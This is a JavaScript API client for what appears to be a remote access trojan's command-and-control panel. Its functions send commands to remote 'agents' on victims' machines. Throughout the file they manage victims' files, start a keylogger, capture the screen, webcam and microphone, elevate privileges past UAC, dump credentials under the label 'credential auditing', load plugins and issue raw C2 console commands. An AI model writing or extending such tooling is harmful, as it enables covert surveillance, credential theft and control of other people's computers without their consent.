import axios from 'axios';

const api = axios.create({
    baseURL: '/api',
    timeout: 30000,
});

// Agents
export const getAgents = () => api.get('/agents');
export const getAgent = (id) => api.get(`/agents/${id}`);

// Commands
export const sendCommand = (agentId, command, parameters = {}) =>
    api.post('/command', { agent_id: agentId, command, parameters });

// Files
export const listFiles = (agentId, path = '') =>
    api.get(`/files/${agentId}`, { params: { path } });
export const uploadFile = (agentId, file, destination) => {
    const formData = new FormData();
    formData.append('file', file);
    formData.append('destination', destination);
    return api.post(`/files/${agentId}`, formData, {
        headers: { 'Content-Type': 'multipart/form-data' }
    });
};
export const downloadFile = (agentId, filepath) =>
    api.get(`/files/${agentId}/download`, {
        params: { path: filepath },
        responseType: 'blob'
    });
export const deleteFile = (agentId, path) =>
    api.delete(`/files/${agentId}`, { data: { path } });
export const createFolder = (agentId, path) =>
    api.post(`/files/${agentId}/mkdir`, { path });
export const renameFile = (agentId, oldPath, newPath) =>
    api.post(`/files/${agentId}/rename`, { old_path: oldPath, new_path: newPath });

// Surveillance
export const captureScreenshot = (agentId) =>
    api.post('/command', { agent_id: agentId, command: 'screenshot' });
export const startKeylogger = (agentId) =>
    api.post('/command', { agent_id: agentId, command: 'keylog_start' });
export const getKeylogs = (agentId) =>
    api.get(`/keylogs/${agentId}`);
export const captureWebcam = (agentId, cameraId = 0) =>
    api.post('/command', { agent_id: agentId, command: 'webcam', parameters: { camera_id: cameraId } });
export const recordMicrophone = (agentId, duration = 5) =>
    api.post('/command', { agent_id: agentId, command: 'mic', parameters: { duration } });

// UAC Elevation
export const elevatePrivileges = (agentId, method = 'auto') =>
    api.post('/command', { agent_id: agentId, command: 'uac_elevate', parameters: { method } });

// Credential Auditing
export const auditCredentials = (agentId, scope = 'all') =>
    api.post('/command', { agent_id: agentId, command: 'audit_creds', parameters: { scope } });

// Plugin Management
export const getPlugins = () => api.get('/plugins');
export const installPlugin = (path) => api.post('/plugins/install', { path });
export const enablePlugin = (id) => api.post(`/plugins/${id}/enable`);
export const disablePlugin = (id) => api.post(`/plugins/${id}/disable`);

// C2 Console
export const sendC2Command = (agentId, command) =>
    api.post('/c2/command', { agent_id: agentId, command });

// AI Copilot
export const askCopilot = (question) =>
    api.post('/copilot', { question });

export default api;
